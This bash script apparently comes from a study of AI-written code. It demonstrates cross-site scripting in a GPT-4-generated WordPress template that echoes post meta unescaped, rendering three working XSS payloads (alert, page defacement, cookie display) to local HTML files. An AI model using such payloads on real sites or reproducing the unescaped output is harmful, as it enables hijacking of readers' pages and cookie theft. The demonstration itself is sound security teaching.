#!/usr/bin/env bash
# Demonstrates Cross-Site Scripting in output/gpt-4/php_005.php. The
# AI's WordPress theme template echoes get_post_meta() output directly,
# unescaped. Whatever HTML an author (or any plugin path that writes
# meta fields without sanitization) puts in 'custom_content' becomes
# raw HTML in every reader's browser.
#
# We render the template through PHP CLI using a tiny WordPress shim
# (wp_shim.php) so no WordPress install is needed. Each render is
# saved as a standalone .html file in out/. You can:
#   - read the rendered HTML in stdout to inspect the injected tags
#   - open out/*.html in a browser via file://
#   - run ./serve.sh and load http://localhost:8765/ for a fully
#     realistic browser-execution demo
#
# Usage:
#   ./run-demo.sh
#
# Run from this directory.

set -e

cd "$(dirname "$0")"

# Precheck: php CLI must be on PATH. The AI's vulnerable code is a
# WordPress theme template; we render it through PHP CLI using a tiny
# WordPress shim so no real WP install is needed, but php itself is
# required.
if ! command -v php >/dev/null 2>&1; then
    echo "Error: this demo requires PHP CLI — 'php' missing on PATH." >&2
    echo >&2
    echo "Install one of:" >&2
    case "$(uname -s)" in
      Darwin)
        echo "  - Homebrew:    brew install php" >&2
        echo "  - MacPorts:    sudo port install php" >&2
        ;;
      Linux)
        echo "  - Debian/Ubuntu: sudo apt install php-cli" >&2
        echo "  - Fedora/RHEL:   sudo dnf install php-cli" >&2
        echo "  - Alpine:        apk add php" >&2
        ;;
      *)
        echo "  - https://www.php.net/downloads.php" >&2
        ;;
    esac
    exit 1
fi

mkdir -p out

# Render one case: print to stdout AND write to out/<file>.
render_case() {
    local out_file="$1"
    local label="$2"
    local payload="$3"
    local rendered
    rendered=$(MALICIOUS_BIO="$payload" php -d auto_prepend_file=wp_shim.php victim_module.php)

    # Wrap rendered output in a full standalone HTML document.
    cat > "out/$out_file" <<EOF
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>$label</title>
  <style>
    body { font-family: -apple-system, system-ui, sans-serif; max-width: 720px; margin: 2em auto; padding: 0 1em; }
    .meta { color: #666; font-size: 0.9em; border-bottom: 1px solid #ddd; padding-bottom: 0.5em; }
    .render { margin-top: 1.5em; padding: 1em; border: 1px solid #ccc; border-radius: 4px; }
  </style>
</head>
<body>
  <div class="meta">
    <strong>$label</strong><br>
    Rendered by output/gpt-4/php_005.php (the AI-generated WordPress theme template) via PHP CLI.
  </div>
  <div class="render">$rendered</div>
</body>
</html>
EOF

    echo "--- $label ---"
    echo "  custom_content meta value:"
    echo "    $payload"
    echo "  rendered HTML written to out/$out_file"
    echo "  (excerpt:)"
    echo "$rendered" | head -10 | sed 's/^/    /'
    echo
}

echo "=== Rendering 4 bios through the AI's WordPress template ==="
echo

render_case "legitimate.html" \
    "Legitimate post meta content" \
    "<p>Welcome to my <strong>blog</strong>!</p>"

render_case "alert.html" \
    "Malicious post meta content - alert() XSS payload" \
    "<img src=x onerror=\"alert('XSS - attacker JS runs in every viewer browser')\">"

render_case "defacement.html" \
    "Malicious post meta content - DOM defacement payload" \
    "<script>document.body.innerHTML='<h1 style=\"color:red;font-family:sans-serif;text-align:center;margin-top:20vh\">Hijacked by attacker</h1>'</script>"

render_case "cookie-display.html" \
    "Malicious post meta content - cookie-display payload" \
    "<script>document.body.innerHTML += '<pre style=\"background:#fee;padding:1em;color:#900;font-size:14pt\">cookies the attacker can read: ' + (document.cookie || '(none on this localhost page)') + '</pre>'</script>"

echo "=== Done ==="
echo "Open one of the generated files in a browser to see each payload"
echo "execute. The alert.html and defacement.html pages are the most"
echo "visible on stage — alert popping a dialog, defacement replacing"
echo "the page body with a red 'Hijacked by attacker' banner."
echo
echo "For an http:// demo (recommended, behaves identically to a real"
echo "victim hitting the live site), run: ./serve.sh"
